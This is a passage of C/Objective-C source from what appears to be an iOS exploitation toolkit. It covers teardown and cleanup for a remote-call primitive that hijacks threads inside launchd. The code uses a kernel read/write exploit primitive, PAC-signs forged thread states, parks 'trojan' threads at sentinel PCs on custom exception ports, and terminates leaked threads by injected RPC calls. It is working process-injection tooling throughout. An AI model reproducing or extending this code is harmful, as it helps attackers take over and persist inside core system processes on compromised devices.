                    __atomic_add_fetch(&g_rc_teardown_left_parked, 1,
                                       __ATOMIC_SEQ_CST);
                    printf("[RC] TEARDOWN INVARIANT VIOLATION: park trap on %s but "
                           "no pthread_exit dispatch possible (KRW lost?) — "
                           "synthetic thread LEFT PARKED at its sentinel "
                           "(landmine; counted for the verify pass, next "
                           "session's sweep will reap it)\n", tag);
                }
                continue;
            }
            printf("[RC] TEARDOWN INVARIANT VIOLATION: park trap on %s "
                   "(pc=%#llx code=%#llx/%#llx) with no restore path left — "
                   "left UNANSWERED (parked); resuming it into a dying port "
                   "would be the dead-port detonator\n",
                   tag, (unsigned long long)stray.threadState.__pc,
                   (unsigned long long)stray.codeFirst,
                   (unsigned long long)stray.codeSecond);
            __atomic_add_fetch(&g_rc_teardown_left_parked, 1, __ATOMIC_SEQ_CST);
            continue;
        }
        // Round 17: count non-protocol (crash) messages separately. The reply
        // stays own-state on purpose: at teardown the alternatives are worse —
        // escalating a launchd-thread crash kills launchd, and re-parking into
        // the RPC protocol would resume a thread at a sentinel PC whose next
        // fault lands on a port we are about to destroy. With the round-17
        // dispatch path fixed, a nonzero crash count here is a backlog that
        // can no longer form; if it ever reappears, the count says so.
        if (stray.exception != EXC_GUARD) {
            crashes++;
            printf("[RC] teardown drain: NON-PROTOCOL trap on %s exc=%u "
                   "code=%#llx/%#llx pc=%#llx — crash backlog message\n",
                   tag, (unsigned)stray.exception,
                   (unsigned long long)stray.codeFirst,
                   (unsigned long long)stray.codeSecond,
                   (unsigned long long)stray.threadState.__pc);
        }
        reply_with_state(&stray, &stray.threadState);
        n++;
    }
    if (n || parked)
        printf("[RC] teardown symmetry: drained %d residual trapped thread(s) "
               "on %s (%d crash backlog, %d parked repaired) — no thread left "
               "parked in our ports\n", n, tag, crashes, parked);
    if (outParked) *outParked = parked;
    return n;
}

// ============================ Round 22 =======================================
// ROOT CAUSE of the recurring initproc-exited/SIGBUS family (proven by
// panic-full-2026-10-03-103548.ips: SEVEN launchd threads with user PC 0x401,
// six TH_WAIT on dead wait-events, one TH_RUN executing the misaligned
// sentinel; and 103807.000.ips: same shape — even after a TEXTBOOK-clean
// teardown with the round-19 invariant holding, live 24.log 10:34-10:35).
//
// There is no launchd-resident stub: a synthetic call thread "parks" by
// faulting at a bare sentinel PC (0x301/0x401) and blocking in the kernel
// exception RPC (mach_msg_rpc_from_kernel) awaiting our reply. The old
// teardown dispatched pthread_exit FIRE-AND-FORGET (do_remote_call_stable(-1,
// ...) — its first-trap wait can miss, and the dispatch itself carries
// LR = 0x401, so a pthread_exit that returns re-faults into a DYING port).
// Every missed dispatch leaks one thread parked on the dead session's port;
// when the port object is finally reaped the wait-queue wakeup RESUMES the
// thread at the sentinel PC → SIGBUS in launchd → initproc exited ~26 s
// later. Leaks accumulate across sessions (7 over ~24 h) and across app
// instances (the registry is per-process; dead instances' threads are
// invisible to the next instance's teardown).
//
// The round-22 fixes, below and at the call sites:
//  (1) Payload-level: every exit dispatch now carries LR = signed
//      pthread_exit — NEVER a sentinel — so a dispatched thread can never
//      re-fault into a dying port; a pthread_exit that returns just re-enters.
//  (2) Teardown: the synthetic thread's death is CONFIRMED via KRW with
//      retries; on failure it is dispatched to pause() — an eternal harmless
//      sleep on a LIVE wait-event with a valid PC, which survives port death
//      and app death without becoming a SIGBUS landmine.
//  (3) Detection + reaping: after every successful launchd-session init, an
//      RPC sweep (task_threads/thread_get_state) counts and thread_terminates
//      sentinel-parked threads that belong to NO live session — including
//      landmines parked by OLD app builds whose teardown still has the bug.
//
// Registry of parked threads belonging to LIVE sessions (any state slot, any
// thread): the sweep must never reap another live session's call thread.
// Shares g_rc_synthetic_mutex with the synthetic registry.
#define RC_LIVE_PARKED_MAX (RC_SYNTHETIC_REGISTRY_MAX * 2)
static uint64_t g_rc_live_parked[RC_LIVE_PARKED_MAX];
static int g_rc_live_parked_count = 0;

static void rc_live_parked_add(uint64_t thread)
{
    if (!thread) return;
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    bool known = false;
    for (int i = 0; i < g_rc_live_parked_count; i++)
        if (g_rc_live_parked[i] == thread) { known = true; break; }
    if (!known && g_rc_live_parked_count < RC_LIVE_PARKED_MAX)
        g_rc_live_parked[g_rc_live_parked_count++] = thread;
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
}

static void rc_live_parked_remove(uint64_t thread)
{
    if (!thread) return;
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    for (int i = 0; i < g_rc_live_parked_count; i++) {
        if (g_rc_live_parked[i] == thread) {
            g_rc_live_parked[i] = g_rc_live_parked[--g_rc_live_parked_count];
            break;
        }
    }
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
}

static bool rc_live_parked_contains(uint64_t thread)
{
    if (!thread) return false;
    bool known = false;
    pthread_mutex_lock(&g_rc_synthetic_mutex);
    for (int i = 0; i < g_rc_live_parked_count; i++)
        if (g_rc_live_parked[i] == thread) { known = true; break; }
    pthread_mutex_unlock(&g_rc_synthetic_mutex);
    return known;
}

// Is the synthetic call thread gone? thread_get_task is ksafe-gated and
// returns 0 for a dead/freed thread slot; a task mismatch means the slot died
// (same round-8 test the tro-dance uses).
static bool rc_synthetic_thread_gone(void)
{
    if (!g_RC_callThreadAddr) return true;
    krw_set_nonfatal(true);
    uint64_t owner = thread_get_task(g_RC_callThreadAddr);
    krw_set_nonfatal(false);
    return owner != g_RC_taskAddr;
}

// One exit-dispatch attempt: consume the synthetic thread's park trap on the
// second port and reply with PC = LR = signed(funcAddr). LR = PC is the
// round-22 payload property: whatever funcAddr does — even RETURNING — the
// thread re-enters it instead of branching to a sentinel. Returns true when a
// dispatch reply was actually sent.
static bool rc_dispatch_exit_once(uint64_t funcAddr, int waitMS, const char *what)
{
    ExceptionMessage exc;
    if (!wait_exception(g_RC_secondExceptionPort, &exc, waitMS, false))
        return false;
    if (!rc_exc_is_park_trap(&exc)) {
        rc_repark_synthetic_thread(&exc, "exit-dispatch non-park trap");
        return false;
    }
    arm_thread_state64_internal st = exc.threadState;
    st.__x[0] = 0;
    if (!sign_state(g_RC_trojanThreadAddr, &st, funcAddr, funcAddr)) {
        // Cannot sign (KRW lost) — re-park unharmed rather than dispatch a
        // garbage PC (the 17:50:30 class).
        reply_with_state(&exc, &exc.threadState);
        printf("[RC] round22 exit-dispatch (%s): sign failed — thread re-parked\n",
               what);
        return false;
    }
    reply_with_state(&exc, &st);
    return true;
}

// Round 22 item 2: CONFIRMED synthetic-thread exit. Replaces the old
// fire-and-forget do_remote_call_stable(-1, "pthread_exit", ...) — the leak
// factory. Returns true only when the thread is provably gone (or never
// existed). On unconfirmed exit the thread is dispatched to pause(): blocked
// in a harmless eternal sleep with a VALID pc — inert forever, even across
// app death. Only a total dispatch failure (no trap, KRW lost) leaves the
// thread parked at the sentinel; that is logged as critically as we can.
static bool rc_exit_synthetic_confirmed(const char *where)
{
    // Round 24: key on the thread's EXISTENCE, not the creatingExtraThread
    // bookkeeping — the mid-init temp-fallback clears creatingExtraThread
    // while the synthetic thread it created keeps existing in launchd.
    if (!g_RC_callThreadAddr)
        return true;

    uint64_t exitAddr  = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_exit");
    uint64_t pauseAddr = (uint64_t)dlsym(RTLD_DEFAULT, "pause");

    for (int attempt = 0; attempt < 3; attempt++) {
        if (rc_synthetic_thread_gone())
            break;
        if (!exitAddr || !g_RC_trojanThreadAddr || !kexploit_krw_ready())
            break;
        if (rc_dispatch_exit_once(exitAddr, 300, "pthread_exit"))
            usleep(120000);   // give pthread_exit time to run thread_terminate
    }

    if (rc_synthetic_thread_gone()) {
        printf("[RC] round22: synthetic call thread exit CONFIRMED (%s)\n", where);
        rc_synthetic_unregister(g_RC_callThreadAddr);
        rc_live_parked_remove(g_RC_callThreadAddr);
        return true;
    }

    // Fallback: eternal safe sleep. A thread blocked in pause() holds no
    // locks, has a valid PC, and is not waiting on anything of ours — it can
    // survive the port death and the process death without ever executing a
    // sentinel. Strictly better than a SIGBUS landmine.
    // Round 22-regression: only claim the pause()-sleep — and only unregister
    // the thread — when a dispatch reply was ACTUALLY sent. The old code
    // printed "dispatched pause()" and unregistered unconditionally, so a
    // double dispatch failure (e.g. the round-21 gate refusing the sign
    // during backgrounding teardown) logged a false success and dropped the
    // still-parked thread from every registry — invisible to the next
    // session's arming walk AND miscounted by the landmine sweep.
    if (pauseAddr && g_RC_trojanThreadAddr && kexploit_krw_ready()) {
        bool pauseDispatched = false;
        for (int attempt = 0; attempt < 2; attempt++) {
            if (rc_synthetic_thread_gone())
                break;
            if (rc_dispatch_exit_once(pauseAddr, 700, "pause-fallback")) {
                pauseDispatched = true;
                break;
            }
        }
        if (rc_synthetic_thread_gone()) {
            // Died of its own accord between checks — that is a confirmed exit.
            printf("[RC] round22: synthetic call thread exit CONFIRMED (%s, "
                   "late check after pause-fallback)\n", where);
            rc_synthetic_unregister(g_RC_callThreadAddr);
            rc_live_parked_remove(g_RC_callThreadAddr);
            return true;
        }
        if (pauseDispatched) {
            printf("[RC] round22: synthetic call thread would NOT exit (%s) — "
                   "dispatched pause(): thread now in a harmless eternal sleep "
                   "(valid PC, no sentinel, survives app death)\n", where);
            log_user("[RC] synthetic call thread leaked into pause()-sleep "
                     "(%s) — inert, not a SIGBUS landmine\n", where);
            rc_synthetic_unregister(g_RC_callThreadAddr);
            rc_live_parked_remove(g_RC_callThreadAddr);
            return false;
        }
        // Dispatch was possible in principle (KRW up, ports valid) but every
        // attempt failed — the thread is STILL PARKED AT THE SENTINEL. Say so
        // honestly, and KEEP it registered so the next session's arming walk
        // skips it and the landmine sweep can still identify it.
        printf("[RC] round22 CRITICAL: synthetic call thread could NOT be "
               "dispatched to exit OR pause() (%s) — still parked at sentinel; "
               "landmine remains, kept in the live-parked registry; the next "
               "session's landmine sweep will reap it\n", where);
        log_user("[WARN] synthetic call thread still parked at sentinel (%s) — "
                 "landmine remains; next session's landmine sweep will reap "
                 "it\n", where);
        return false;
    }

    printf("[RC] round22 CRITICAL: synthetic call thread still parked at a "
           "sentinel and NO exit/sleep dispatch was possible (%s, KRW dead?) — "
           "this thread is a landmine when its port is reaped; the next "
           "session's landmine sweep will try to reap it via thread_terminate\n",
           where);
    log_user("[WARN] synthetic call thread could not be exited (%s) — left "
             "parked; will be reaped by the next session's landmine sweep\n",
             where);
    return false;
}

// Round 22 items 1+3: launchd landmine sweep. Runs ONCE per successful
// launchd-session init (cold path only — the warm-path kill reuses the
// session and never re-inits). Enumerates launchd's threads from INSIDE
// launchd (task_threads via RPC, using the trojanMem scratch page), finds
// threads whose saved PC is a protocol sentinel, and thread_terminates every
// one that belongs to no LIVE session. Those are leaked synthetic/trojan
// threads parked on DEAD sessions' ports — including ones parked by OLD app
// builds whose teardown still had the fire-and-forget bug. Terminating them
// is the only safe disposition: their trap messages live in dead ports and
// can never be answered; left alone they detonate (SIGBUS) the moment their
// wait-queue is woken. Sentinel PCs (< 0x500, page zero) can never belong to
// a legitimate launchd thread, so the pattern match cannot hit an innocent.
static void rc_sweep_leaked_landmines(void)
{
    if (g_RC_pid != 1) return;                 // landmines live in launchd
    if (!g_RC_trojanMem || !g_RC_trojanThreadAddr) return;
    if (!kexploit_krw_ready()) {
        printf("[RC] landmine sweep: KRW not ready — skipped this init\n");
        return;
    }

    uint64_t scratch = g_RC_trojanMem;
    // Scratch layout inside the one RW page we already own in launchd:
    //   +0x000 u64  task_threads act_list out
    //   +0x008 u32  act_list count out
    //   +0x010      arm_thread_state64_t state out (0x110 bytes; pc at +0x100)
    //   +0x130 u32  state flavor count in/out
    uint64_t taskName = do_remote_call_stable(200, "mach_task_self",
                                              0, 0, 0, 0, 0, 0, 0, 0);
    if (!taskName || taskName > 0x100000) {
        printf("[RC] landmine sweep: mach_task_self failed (%#llx) — skipped\n",
               (unsigned long long)taskName);
        return;
    }
    int kr = (int)(int32_t)do_remote_call_stable(200, "task_threads",
                                                 taskName, scratch, scratch + 8,
                                                 0, 0, 0, 0, 0);
    if (kr != 0) {
        printf("[RC] landmine sweep: task_threads failed kr=%d — skipped\n", kr);
        return;
    }
    uint64_t listAddr = remote_read64(scratch);
    uint32_t count = (uint32_t)remote_read64(scratch + 8);
    if (!listAddr || count == 0 || count > 1024) {
        printf("[RC] landmine sweep: implausible thread list addr=%#llx "
               "count=%u — skipped\n",
               (unsigned long long)listAddr, count);
        return;
    }

    int landmines = 0, reaped = 0, errors = 0;
    // Round 22-regression hard guard: NEVER thread_terminate launchd's first
    // thread. task_threads hands back the list in creation order, so entry 0
    // is launchd's main thread; terminating it kills pid 1 regardless of what
    // its saved PC happens to read as (a transient bogus state read must not
    // be able to turn this sweep into an initproc kill). Capture its kobj up
    // front and refuse any terminate against it — loudly.
    uint64_t firstThreadKobj = 0;
    for (uint32_t i = 0; i < count; i++) {
        // Entries are 4-byte port names; reading 8 and masking is fine (the
        // vm_read behind remote_read64 fails safe to 0 past the region).
        uint32_t thName = (uint32_t)remote_read64(listAddr + (uint64_t)i * 4);
        if (!thName) continue;
        if (i == 0)
            firstThreadKobj = task_get_ipc_port_kobject(g_RC_taskAddr, thName);

        uint32_t stateCnt = ARM_THREAD_STATE64_COUNT;
        remote_write(scratch + 0x130, &stateCnt, sizeof(stateCnt));
        int gkr = (int)(int32_t)do_remote_call_stable(200, "thread_get_state",
                                                      thName, ARM_THREAD_STATE64,
                                                      scratch + 0x10,
                                                      scratch + 0x130,
                                                      0, 0, 0, 0);
        if (gkr != 0) {
            errors++;
            do_remote_call_stable(100, "mach_port_deallocate",
                                  taskName, thName, 0, 0, 0, 0, 0, 0);
            continue;
        }
        uint64_t pc = remote_read64(scratch + 0x10 + 0x100);
        if (rc_pc_is_sentinel(pc)) {
            uint64_t kobj = task_get_ipc_port_kobject(g_RC_taskAddr, thName);
            // Hard guard: launchd's main thread is untouchable, sentinel or not.
            if (kobj && firstThreadKobj && kobj == firstThreadKobj) {
                printf("[RC] landmine sweep: REFUSING to thread_terminate "
                       "launchd's first thread (name %#x kobj %#llx) even "
                       "though its saved PC reads as sentinel %#llx — a bogus "
                       "state read must never become an initproc kill\n",
                       thName, (unsigned long long)kobj,
                       (unsigned long long)pc);
                log_user("[RC] landmine sweep: refused to terminate launchd's "
                         "first thread despite sentinel-looking PC — hard "
                         "guard held\n");
                do_remote_call_stable(100, "mach_port_deallocate",
                                      taskName, thName, 0, 0, 0, 0, 0, 0);
                continue;
            }
            bool ours = (kobj && (kobj == g_RC_trojanThreadAddr ||
                                  kobj == g_RC_callThreadAddr)) ||
                        rc_live_parked_contains(kobj);
            if (!ours) {
                landmines++;
                int tkr = (int)(int32_t)do_remote_call_stable(200,
                                "thread_terminate", thName, 0, 0, 0, 0, 0, 0, 0);
                if (tkr == 0) reaped++;
                else { errors++; printf("[RC] landmine sweep: thread_terminate "
                                        "failed kr=%d for thread name %#x\n",
                                        tkr, thName); }
            }
        }
        // task_threads handed us a send right per thread — drop every one so
        // the sweep itself does not leak port names into launchd.
        do_remote_call_stable(100, "mach_port_deallocate",
                              taskName, thName, 0, 0, 0, 0, 0, 0);
    }
    do_remote_call_stable(200, "vm_deallocate", taskName, listAddr,
                          ((uint64_t)count * 4 + PAGE_MASK) & ~((uint64_t)PAGE_MASK),
                          0, 0, 0, 0, 0);

    // Round 22 item 3: the visible metric. landmines should stop growing once
    // no old-build sessions leak, and reach zero once every stale one is reaped.
    printf("[RC] landmine sweep: %d leaked sentinel-parked thread(s) found, "
           "%d reaped, %d error(s)\n", landmines, reaped, errors);
    log_user("[RC] launchd landmines: %d leaked parked thread(s) found, "
             "%d reaped%s\n", landmines, reaped,
             errors ? " (some errors — see debug log)" : "");
}

// Round 19: teardown un-arm audit. Guards are cleared at setup end, but a
// clear skipped on a KRW op-error (round 16 logs it loudly) would leave a
// thread armed past teardown — its late trap then detonates on a DEAD port
// (the 195243-class "exception to a dead port → launchd exits ~22 s later").
// Re-run the round-16 ownership-gated clear over every thread this session
// armed; clear_guard_exception is idempotent (skips threads whose AST_GUARD is
// already consumed/cleared) and gated against freed/reused slots.
static void rc_teardown_unarm_all(const char *where)
{
    if (!kexploit_krw_ready()) {
        printf("[RC] teardown un-arm audit SKIPPED (%s) — KRW down; %lu "
               "previously-armed thread(s) cannot be re-verified (guards were "
               "cleared at setup; a setup-time skip logged loudly)\n",
               where, (unsigned long)g_RC_threadList.count);
        return;
    }
    NSUInteger n = 0;
    for (NSNumber *thread in g_RC_threadList) {
        clear_guard_exception(thread.unsignedLongLongValue);
        n++;
    }
    if (n)
        printf("[RC] teardown un-arm audit (%s): re-verified %lu injected "
               "thread(s) — none left armed\n", where, (unsigned long)n);
}

// Round 19: post-drain settle + verification pass — the TEARDOWN INVARIANT:
// when this session's ports die, the number of launchd threads left ARMED
// with our AST_GUARD or PARKED at a protocol sentinel in our ports MUST BE
// ZERO. Arms are cleared at setup end and re-verified above; parked threads
// are restored/exited by the drain. A nonzero leftover is the 195243-class
// detonator: the thread's next fault is undeliverable on the dead port and
// launchd exits ~19-22 s later ("initproc exited").
static int rc_teardown_verify_zero_parked(const char *where)
{
    usleep(30000);   // let anything the drain resumed land its final trap
    int parkedFirst = 0, parkedSecond = 0;
    rc_drain_stray_traps(g_RC_firstExceptionPort, "first port (verify)", &parkedFirst);
    rc_drain_stray_traps(g_RC_secondExceptionPort, "second port (verify)", &parkedSecond);
    int leaked = parkedFirst + parkedSecond;
    // Round 22-regression: "zero parked" must also count threads whose traps
    // this teardown CONSUMED but could not answer (sign/dispatch failure) —
    // they are parked at sentinels too, and the old code's unconditional
    // "INVARIANT holds" hid exactly the 123329/123448 landmine. The exchange
    // resets the counter for the next teardown.
    int leftParked = __atomic_exchange_n(&g_rc_teardown_left_parked, 0,
                                         __ATOMIC_SEQ_CST);
    if (leaked) {
        printf("[RC] TEARDOWN INVARIANT VIOLATION (%s): %d park trap(s) leaked "
               "past the main drain (repaired in the verify pass) — the "
               "setup/restore path that parked them needs investigation\n",
               where, leaked);
    }
    if (leftParked) {
        printf("[RC] TEARDOWN INVARIANT VIOLATION (%s): %d launchd thread(s) "
               "LEFT PARKED at protocol sentinels — their traps were consumed "
               "but no restore/dispatch could be signed; they remain landmines "
               "(registered for the next session's landmine sweep)\n",
               where, leftParked);
        log_user("[WARN] teardown (%s): %d launchd thread(s) left parked at "
                 "sentinels — landmines remain; next session's sweep will "
                 "reap them\n", where, leftParked);
    }
    if (!leaked && !leftParked) {
        printf("[RC] TEARDOWN INVARIANT holds (%s): zero launchd threads left "
               "armed or parked at protocol sentinels in this session's ports\n",
               where);
    }
    return leaked + leftParked;
}

void abandon_remote_call(void) {
    // Cleanup bypasses the detach gate: it restores/releases threads and is
    // part of the in-flight lifecycle — a pending detach must wait for it.
    remote_call_inflight_begin_ex("abandon", true);
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    abandon_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    remote_call_inflight_end("abandon");
}

void abandon_remote_call_internal(void) {
    // Round 24: the excport teardown bypass lives in the INTERNALS, not the
    // public wrappers — init-failure paths call destroy/abandon internals
    // directly, and the round-23 wrapper-only placement let exactly those
    // paths tear down UNSIGNED behind the closed gate (142628: trojan restore
    // re-sign refused → a 0x201 park trap left unanswered → SIGBUS when the
    // app died 34 s later). The depth counter is re-entrant, so nested
    // teardown scopes stay correct.
    excport_teardown_bypass_begin("abandon");
    if (g_RC_vphoneBridge) {
        g_RC_vphoneBridge = false;
        g_RC_success = false;
        g_RC_pid = 0;
        g_RC_threadList = [NSMutableArray new];
        excport_teardown_bypass_end("abandon");
        return;
    }

    // Skip every SB-side IPC. Caller has decided that the remote task is dead
    // (typically SpringBoard finished a respawn). Touching the dead trojan
    // would hang for the call timeout. Local resources still need releasing.
    // But first free anything still trapped in our ports: when the target is
    // actually ALIVE (launchd with unrecoverable KRW — the round-3/5 residual
    // case), a queued trap answered with its own state resumes that thread
    // cleanly; unanswered, it hangs the thread and watchdogs launchd ~22 s
    // after we exit. Bounded (150 ms per empty port) so a dead target costs
    // nothing. Round 19: park traps found here are RESTORED/EXITED by the
    // drain (not own-state-resumed into a dying port) — see the drain.
    rc_teardown_unarm_all("abandon");
    int parkedAbandonFirst = 0, parkedAbandonSecond = 0;
    int drainedAbandon = rc_drain_stray_traps(g_RC_firstExceptionPort, "first port", &parkedAbandonFirst)
                       + rc_drain_stray_traps(g_RC_secondExceptionPort, "second port", &parkedAbandonSecond);
    printf("[RC] abandon: residual traps drained=%d (parked repaired: %d) — no "
           "thread left parked in our ports\n",
           drainedAbandon, parkedAbandonFirst + parkedAbandonSecond);
    rc_teardown_verify_zero_parked("abandon");
    // Round 21 (T3): threads un-armed and drained — now put the remote task's
    // task_exc_guard flags back BEFORE our ports die. KRW is often dead on
    // this path; the helper then names the residual risk instead of writing.
    rc_restore_task_exc_guard("abandon");
    rc_armed_snapshot_forget();   // round 10: session gone; nothing of ours armed
    rc_livearm_unregister_owner(rc_current_owner());   // round 20
    rc_anomalous_port_clear(g_RC_firstExceptionPort);  // round 20: before the name dies
    rc_anomalous_port_clear(g_RC_secondExceptionPort);
    destroy_exception_port(g_RC_firstExceptionPort);
    destroy_exception_port(g_RC_secondExceptionPort);
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("abandon_remote_call");
    rc_live_parked_remove(g_RC_trojanThreadAddr);   // round 22
    rc_live_parked_remove(g_RC_callThreadAddr);     // round 22
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_callThreadPort = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pacKeysCached = false;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_vphoneBridge = false;
    g_RC_trojanMem = 0;
    g_RC_threadList = [NSMutableArray new];
    excport_teardown_bypass_end("abandon");
}

int destroy_remote_call(void) {
    // Cleanup bypasses the detach gate: restore must always run (see above).
    remote_call_inflight_begin_ex("destroy", true);
    pthread_once(&g_universal_ipc_mutex_once, init_universal_mutex);
    pthread_mutex_lock(&g_universal_ipc_mutex);
    int res = destroy_remote_call_internal();
    pthread_mutex_unlock(&g_universal_ipc_mutex);
    remote_call_inflight_end("destroy");
    return res;
}

int destroy_remote_call_internal(void) {
    // Round 24: bypass lives in the INTERNAL (see abandon_remote_call_internal
    // for why — the 142628 unsigned-teardown hole was a direct internal call).
    excport_teardown_bypass_begin("destroy");
    if (g_RC_vphoneBridge) {
        g_RC_vphoneBridge = false;
        g_RC_pid = 0;
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        excport_teardown_bypass_end("destroy");
        return 0;
    }

    if (!remote_call_has_local_state()) {
        clear_remote_shmem_cache();
        (void)reap_dead_port_names("destroy_remote_call");
        rc_livearm_unregister_owner(rc_current_owner());   // round 20
        g_RC_success = false;
        g_RC_threadList = [NSMutableArray new];
        excport_teardown_bypass_end("destroy");
        return 0;
    }

    if (g_RC_trojanMem) {
        // Round 32: LEAK the trojan scratch page instead of munmap-ing it. The
        // munmap ran HERE — before the synthetic thread is exited (below) and
        // before the trojan restore — but the synthetic thread can be parked
        // using this very page as its RPC message buffer; freeing it first lets
        // that thread (or a late protocol trap) fault on an unmapped scratch
        // page inside launchd, which routes its exception to our port and, once
        // we are suspended, never gets answered (the KERN_FAILURE-user-fault →
        // launchd-wedge class). abandon_remote_call already leaks it (zeroes
        // without munmap); match that. One PAGE_SIZE per session is a bounded,
        // accepted boot-lifetime leak — the proven-fatal alternative is a
        // freed-page fault in launchd. The remote munmap RPC removed here is
        // also one fewer teardown round-trip that can stall mid-suspend.
        printf("[RC] teardown: leaking trojan scratch page %#llx (NOT munmap'd) "
               "— freeing it can fault a parked launchd thread on its RPC buffer\n",
               (unsigned long long)g_RC_trojanMem);
        g_RC_trojanMem = 0;
    }
    if (g_RC_callThreadAddr && !g_RC_creatingExtraThread && g_RC_callThreadPort &&
        kexploit_krw_ready()) {
        // Round 24 (142628): the mid-init temp-fallback ("Couldn't resume new
        // thread → falling back to original") clears creatingExtraThread while
        // the synthetic thread it just created keeps EXISTING in launchd —
        // created suspended, never resumed, start = the sentinel gadget. The
        // old branch below keyed on creatingExtraThread and so never accounted
        // for it at all: an orphaned latent landmine. The temp RPC channel
        // (trojan) is still alive at this point in the teardown — terminate
        // the orphan through it, BEFORE the trojan restore below ends remote
        // execution. rc_exit_synthetic_confirmed afterwards confirms death
        // via KRW (its first gone-check passes instantly).
        printf("[RC] round24: synthetic call thread ORPHANED by a mid-init "
               "temp-fallback (suspended, never resumed) — terminating it via "
               "the temp channel before the trojan restore\n");
        for (int attempt = 0; attempt < 3 && !rc_synthetic_thread_gone(); attempt++) {
            do_remote_call_temp(200, "thread_terminate", g_RC_callThreadPort,
                                0, 0, 0, 0, 0, 0, 0);
            usleep(50000);
        }
        if (rc_synthetic_thread_gone())
            printf("[RC] round24: orphaned synthetic call thread TERMINATED "
                   "(confirmed via KRW)\n");
        else
            printf("[RC] round24 CRITICAL: orphaned synthetic call thread "
                   "thread_terminate did not confirm — kept in the live-parked "
                   "registry for the next session's sweep\n");
    }
    if (g_RC_callThreadAddr) {
        // Round 22/24: exit is CONFIRMED via KRW with a pause() eternal-sleep
        // fallback; see rc_exit_synthetic_confirmed. Keyed on the thread's
        // EXISTENCE (round 24), not the creatingExtraThread bookkeeping.
        (void)rc_exit_synthetic_confirmed("destroy");
    }
    if (!g_RC_creatingExtraThread) {
        // Round 19: a failed restore leaves the trojan parked at a protocol
        // sentinel — with the port about to die that is the dead-port
        // detonator ("initproc exited" ~19-22 s later). Scream; the drain
        // below restores the parked trojan with its original state.
        if (!restore_trojan_thread(&g_RC_originalState)) {
            printf("[RC] destroy: trojan restore FAILED — thread still parked; "
                   "the teardown drain will restore it from its park trap\n");
        }
    }

    // Symmetry check (round 5): init injected the GUARD AST on the injected
    // threads and a late trap from a non-trojan one can still be queued here.
    // Free every residual trapped thread BEFORE the ports die — an unanswered
    // trap parks that launchd thread forever and watchdogs the device ~22 s
    // after exit. (The round-7 responder may race this drain; each message is
    // delivered to exactly one waiter and the reply is identical, and the
    // responder exits when the ports die below.)
    // Round 19: re-verify every injected thread is un-armed BEFORE draining
    // (a setup-time clear skipped on a KRW op-error would otherwise detonate
    // on the dead port), and let the drain RESTORE park-trapped protocol
    // threads instead of own-state-resuming them into the dying port.
    rc_teardown_unarm_all("destroy");
    int parkedFirst = 0, parkedSecond = 0;
    int drainedTeardown = rc_drain_stray_traps(g_RC_firstExceptionPort, "first port", &parkedFirst)
                        + rc_drain_stray_traps(g_RC_secondExceptionPort, "second port", &parkedSecond);
    printf("[RC] teardown symmetry: trojan %s, residual traps drained=%d "
           "(parked repaired: %d) — no thread left parked in our ports\n",
           g_RC_creatingExtraThread ? "pthread_exit dispatched" : "restored",
           drainedTeardown, parkedFirst + parkedSecond);
    // Round 19 TEARDOWN INVARIANT: the number of launchd threads left ARMED
    // with our AST_GUARD or PARKED at a protocol sentinel after this teardown
    // MUST BE ZERO. Verified with a settle + second drain pass inside.
    rc_teardown_verify_zero_parked("destroy");
    // Round 21 (T3): threads un-armed and drained — restore the remote task's
    // original task_exc_guard flags before our exception ports die, so a
    // future guard violation in the remote task takes its stock path instead
    // of wedging on a delivery into our dead ports.
    rc_restore_task_exc_guard("destroy");
    rc_armed_snapshot_forget();   // round 10: session gone; nothing of ours armed
    rc_livearm_unregister_owner(rc_current_owner());   // round 20
    rc_anomalous_port_clear(g_RC_firstExceptionPort);  // round 20: before the name dies
    rc_anomalous_port_clear(g_RC_secondExceptionPort);

    destroy_exception_port(g_RC_firstExceptionPort);
    destroy_exception_port(g_RC_secondExceptionPort);
    if (g_RC_dummyThread) pthread_cancel(g_RC_dummyThread);
    if (MACH_PORT_VALID(g_RC_dummyThreadMach)) {
        mach_port_deallocate(mach_task_self_, g_RC_dummyThreadMach);
    }
    clear_remote_shmem_cache();
    (void)reap_dead_port_names("destroy_remote_call");
    rc_live_parked_remove(g_RC_trojanThreadAddr);   // round 22
    rc_live_parked_remove(g_RC_callThreadAddr);     // round 22
    g_RC_taskAddr = 0;
    g_RC_firstExceptionPort = MACH_PORT_NULL;
    g_RC_secondExceptionPort = MACH_PORT_NULL;
    g_RC_firstExceptionPortAddr = 0;
    g_RC_secondExceptionPortAddr = 0;
    g_RC_dummyThread = NULL;
    g_RC_dummyThreadMach = MACH_PORT_NULL;
    g_RC_dummyThreadAddr = 0;
    g_RC_dummyThreadTro = 0;
    g_RC_selfThreadAddr = 0;
    g_RC_selfThreadCtid = 0;
    g_RC_vmMap = 0;
    g_RC_callThreadAddr = 0;
    g_RC_callThreadPort = 0;
    g_RC_trojanThreadAddr = 0;
    g_RC_pacKeysCached = false;
    g_RC_pid = 0;
    g_RC_success = false;
    g_RC_creatingExtraThread = false;
    g_RC_vphoneBridge = false;
    g_RC_trojanMem = 0;

    g_RC_threadList = [NSMutableArray new];

    excport_teardown_bypass_end("destroy");
    return 0;
}

bool remote_call_has_local_state(void) {
